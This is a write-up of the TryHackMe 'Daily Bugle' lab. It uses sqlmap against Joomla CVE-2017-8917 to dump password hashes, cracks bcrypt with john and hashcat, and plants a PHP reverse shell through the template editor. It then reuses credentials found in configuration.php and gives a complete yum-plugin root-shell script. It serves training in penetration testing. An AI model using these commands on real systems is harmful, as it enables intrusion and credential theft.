# Daily Bugle

**Platform:** TryHackMe
**OS:** Linux
**Tags:** Joomla, CVE-2017-8917, SQLi, bcrypt, yum PrivEsc, GTFOBins
**Date:** 2026-05-04

CVE-2017-8917 SQLi on Joomla 3.7.0 dumps the admin bcrypt hash; cracking it with john gives admin access and a PHP reverse shell via the template editor. Password reuse from the config file gives a user with passwordless sudo on yum for root.

## 1. Enumeration

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Findings:
- 22/tcp - OpenSSH 7.4
- 80/tcp - Apache 2.4.6, Joomla CMS detected
- 3306/tcp - MySQL (local only)

Identified Joomla running on port 80. Ran Joomscan to fingerprint the version.

```bash
joomscan --url http://<TARGET_IP>
```

**Joomla 3.7.0 identified**, vulnerable to CVE-2017-8917 (SQL injection).

## 2. Joomla SQLi (CVE-2017-8917)

Joomla 3.7.0 contains an unauthenticated SQL injection vulnerability in the `com_fields` component. Used sqlmap to extract credentials from the database.

```bash
sqlmap -u "http://<TARGET_IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -p list[fullordering] \
  --dbs
```

```bash
sqlmap -u "http://<TARGET_IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -p list[fullordering] \
  -D joomla -T '#__users' --dump
```

**Admin username and bcrypt password hash extracted.**

## 3. Hash Cracking

The extracted hash is bcrypt ($2y$) - slow to crack. Used John with rockyou.txt.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Note: bcrypt is intentionally slow. This can take a while even with rockyou. Be patient. If John is too slow, try hashcat with GPU acceleration: `hashcat -m 3200 hash.txt rockyou.txt`

**Password cracked. Joomla admin access gained.**

## 4. Initial Foothold: PHP Reverse Shell

Logged into the Joomla admin panel at `/administrator`. Navigated to **Extensions - Templates - Templates - Protostar - error.php** and replaced the content with a PHP reverse shell.

```bash
nc -lvnp 4444
```

Triggered the shell by visiting:

```
http://<TARGET_IP>/templates/protostar/error.php
```

**Shell caught as apache (www-data equivalent).**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z && stty raw -echo; fg
export TERM=xterm
```

## 5. Lateral Movement: jjameson

Searched the Joomla configuration file for database credentials. These are often reused by system users.

```bash
cat /var/www/html/configuration.php | grep password
```

**Database password found in config. Reused as SSH password for user jjameson.**

```bash
ssh jjameson@<TARGET_IP>
```

User flag retrieved from `/home/jjameson/user.txt`.

## 6. Privilege Escalation: yum

Checked sudo permissions for jjameson:

```bash
sudo -l
```

- sudo yum: jjameson can run yum as root with no password

GTFOBins has a yum privesc. Create a malicious RPM plugin that spawns a root shell.

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import TYPE_CORE
plugin_type = (TYPE_CORE,)
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

**Root shell obtained. Root flag retrieved from /root/root.txt**

Key Takeaway: Always check `sudo -l` immediately after lateral movement. Package managers like yum, apt, pip running as sudo are instant root via GTFOBins.
